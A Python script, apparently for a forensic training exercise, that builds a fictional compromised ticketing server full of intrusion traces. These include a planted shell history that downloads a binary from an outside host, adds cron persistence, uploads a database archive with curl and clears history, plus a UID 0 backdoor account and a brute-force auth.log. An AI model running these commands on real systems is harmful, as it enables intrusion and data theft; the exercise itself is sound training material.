#!/usr/bin/env python3
"""Gera o mundo Pé de Moleque: a bilheteria comprometida, com os rastros
que a triagem vai encontrar. Tudo fictício: o "minerador" só abre uma
conexão parada e dorme; não há código malicioso.

Uso: gerar-pe_de_moleque.py <rootfs>
"""
import os
import random
import shutil
import subprocess
import sys

ROOT = sys.argv[1]
R = os.path.join(ROOT, "srv/bilheteria")
ESC = os.path.join(ROOT, "etc/escopo")
AUDITOR, ADMIN = 2001, 2002
ADM_GID = 4


def escrever(caminho, texto, modo=0o644, uid=0, gid=0, quando=None):
    os.makedirs(os.path.dirname(caminho), exist_ok=True)
    with open(caminho, "w", encoding="utf-8") as f:
        f.write(texto)
    os.chmod(caminho, modo)
    os.chown(caminho, uid, gid)
    if quando:
        subprocess.run(["touch", "-d", quando, caminho], check=True)


# Esqueleto do chroot: pontos de montagem e diretórios do sistema
for d in ["bin", "sbin", "usr", "lib", "dev", "proc", "etc/crontabs", "etc/profile.d", "var/log", "var/backups", "home", "tmp"]:
    os.makedirs(os.path.join(R, d), exist_ok=True)
os.chmod(os.path.join(R, "tmp"), 0o1777)

escrever(f"{R}/etc/hostname", "bilheteria\n")
escrever(f"{R}/etc/passwd", "\n".join([
    "root:x:0:0:root:/root:/bin/sh",
    "daemon:x:2:2:daemon:/sbin:/sbin/nologin",
    "nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin",
    "mysql:x:101:102:mysql:/var/lib/mysql:/sbin/nologin",
    f"auditor:x:{AUDITOR}:{AUDITOR}:Auditor (Pente Fino):/home/auditor:/bin/bash",
    f"admin:x:{ADMIN}:{ADMIN}:Wanderson (TI):/home/admin:/bin/bash",
    "suporte:x:0:0::/home/suporte:/bin/sh",
]) + "\n", quando="2026-11-19 03:44:12")
escrever(f"{R}/etc/group", "\n".join([
    "root:x:0:", "adm:x:4:auditor", "wheel:x:10:admin", f"auditor:x:{AUDITOR}:", f"admin:x:{ADMIN}:",
]) + "\n")
escrever(f"{R}/etc/profile",
         'export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\n'
         'for f in /etc/profile.d/*.sh; do [ -r "$f" ] && . "$f"; done\n')
shutil.copy(os.path.join(ROOT, "etc/profile.d/escopo.sh"), f"{R}/etc/profile.d/escopo.sh")
with open(f"{R}/etc/profile.d/escopo.sh", "a", encoding="utf-8") as f:
    # prompt em amarelo: você está no servidor do cliente, não no seu notebook
    f.write("PS1='\\[\\e[38;5;226m\\]\\u@\\h\\[\\e[0m\\]:\\[\\e[1m\\]\\w\\[\\e[0m\\]\\$ '\n")

os.makedirs(f"{R}/home/auditor", exist_ok=True)
os.chown(f"{R}/home/auditor", AUDITOR, AUDITOR)
os.makedirs(f"{R}/home/admin/.ssh", exist_ok=True)
os.chown(f"{R}/home/admin", ADMIN, ADMIN)
os.chmod(f"{R}/home/admin", 0o755)

escrever(f"{R}/home/admin/.ssh/authorized_keys",
         "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK7vYwJm1QpFh3nTo1xL0bTqv9mWbRkE8m2bq3cR0aXn wanderson@notebook-ti\n"
         "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq8RzZp4aQx0nYt7Lb2mVcEo1sUuP9dKfJ3hW6xT2Yb x@vps\n",
         0o644, ADMIN, ADMIN, "2026-11-19 03:43:30")

escrever(f"{R}/home/admin/.bash_history", "\n".join([
    "uname -a", "id", "cat /etc/passwd", "ls -la /var/www",
    "mkdir -p /tmp/.x && cd /tmp/.x",
    "wget http://198.51.100.66/k -O kworkerd",
    "chmod +x kworkerd",
    '(crontab -l; echo "*/10 * * * * /tmp/.x/kworkerd") | crontab -',
    "vi ~/.ssh/authorized_keys",
    "ls -la /var/backups",
    "sudo tar czf /tmp/.x/s.tgz /var/backups/socios.sql",
    "curl -s -T /tmp/.x/s.tgz http://198.51.100.66/up/",
    "rm /tmp/.x/s.tgz",
    "history -c",
]) + "\n", 0o644, ADMIN, ADMIN, "2026-11-19 04:01:55")

escrever(f"{R}/tmp/.x/kworkerd",
         "#!/bin/sh\n"
         "# kworkerd: nada de kernel aqui.\n"
         "POOL=198.51.100.66:3333\n"
         "CARTEIRA=4PDMxFicticiaNaoExisteNemTenta0000000000000000\n"
         "while true; do\n"
         "  ncat --recv-only 198.51.100.66 3333 >/dev/null 2>&1\n"
         "  sleep 20\n"
         "done\n", 0o755, ADMIN, ADMIN, "2026-11-19 03:43:05")
os.chown(f"{R}/tmp/.x", ADMIN, ADMIN)
subprocess.run(["touch", "-d", "2026-11-19 04:01:40", f"{R}/tmp/.x"], check=True)

escrever(f"{R}/etc/crontabs/admin", "*/10 * * * * /tmp/.x/kworkerd\n", 0o644, 0, 0, "2026-11-19 03:43:18")
escrever(f"{R}/var/backups/socios.sql",
         "-- dump da base de socios-torcedores (conteudo fora do alcance do auditor)\n" + "x" * 4096 + "\n",
         0o600, 0, 0, "2026-11-18 02:00:00")
escrever(f"{R}/etc/motd", "Bilheteria Pe de Moleque F.C. - servidor de producao\n")


# Linha do tempo no auth.log
def linhas_auth():
    rnd = random.Random(1912)
    L = []
    host = "bilheteria"
    for dia, hora in (("Nov 17", "09:02:11"), ("Nov 18", "08:57:40")):
        L.append(f"{dia} {hora} {host} sshd[{rnd.randint(1000, 9000)}]: Accepted publickey for admin from 10.30.0.50 port {rnd.randint(40000, 60000)} ssh2: ED25519 SHA256:wandersonTI")
    m, s = 12, 1
    for i in range(46):
        user = "admin" if i % 3 else "root"
        L.append(f"Nov 19 03:{m:02d}:{s:02d} {host} sshd[{4100 + i}]: Failed password for {user} from 203.0.113.66 port {rnd.randint(30000, 65000)} ssh2")
        s += rnd.randint(20, 50)
        while s >= 60:
            s -= 60
            m += 1
    L.append(f"Nov 19 03:42:07 {host} sshd[4211]: Accepted password for admin from 203.0.113.66 port 51122 ssh2")
    L.append(f"Nov 19 03:42:07 {host} sshd[4211]: pam_unix(sshd:session): session opened for user admin")
    L.append(f"Nov 19 03:44:12 {host} useradd[4302]: new user: name=suporte, UID=0, GID=0, home=/home/suporte, shell=/bin/sh")
    L.append(f"Nov 19 04:01:58 {host} sshd[4211]: pam_unix(sshd:session): session closed for user admin")
    L.append(f"Nov 21 09:05:33 {host} sshd[5120]: Accepted publickey for admin from 10.30.0.50 port 49210 ssh2: ED25519 SHA256:wandersonTI")
    L.append(f"Nov 22 08:00:02 {host} sshd[5301]: Accepted publickey for auditor from 10.8.0.2 port 40022 ssh2: ED25519 SHA256:auditorPenteFino")
    return "\n".join(L) + "\n"


escrever(f"{R}/var/log/auth.log", linhas_auth(), 0o640, 0, ADM_GID)
escrever(os.path.join(ESC, "reteste/auth.log.extra"),
         "Nov 23 10:12:40 bilheteria passwd[6001]: password for admin changed by root\n"
         "Nov 23 10:13:02 bilheteria crond[6010]: crontab for admin removed\n", 0o600)

# Chaves: host do servidor e a do auditor (entregue no contrato)
ssh = os.path.join(ESC, "ssh")
os.makedirs(ssh, exist_ok=True)
for arq in ("ssh_host_ed25519_key", "id_auditor"):
    for ext in ("", ".pub"):
        p = os.path.join(ssh, arq + ext)
        if os.path.exists(p):
            os.remove(p)
subprocess.run(["ssh-keygen", "-q", "-N", "", "-t", "ed25519", "-C", "bilheteria", "-f", f"{ssh}/ssh_host_ed25519_key"], check=True)
subprocess.run(["ssh-keygen", "-q", "-N", "", "-t", "ed25519", "-C", "auditor@pentefino", "-f", f"{ssh}/id_auditor"], check=True)
chaves = os.path.join(ROOT, "etc/ssh/chaves")
os.makedirs(chaves, exist_ok=True)
os.chmod(chaves, 0o755)
shutil.copy(f"{ssh}/id_auditor.pub", f"{chaves}/auditor")
os.chmod(f"{chaves}/auditor", 0o644)
escrever(f"{ssh}/banner", "Bilheteria Pe de Moleque F.C. - acesso monitorado (dizem).\n")

skel = os.path.join(ROOT, "etc/skel/.ssh")
os.makedirs(skel, exist_ok=True)
shutil.copy(f"{ssh}/id_auditor", f"{skel}/id_auditor")
os.chmod(f"{skel}/id_auditor", 0o600)
os.chmod(skel, 0o700)
escrever(f"{skel}/config", "Host 10.30.0.15 bilheteria\n  User auditor\n  IdentityFile ~/.ssh/id_auditor\n  StrictHostKeyChecking accept-new\n", 0o600)

open(os.path.join(ESC, "mundo.ativo"), "w").close()
print("mundo Pé de Moleque gerado")
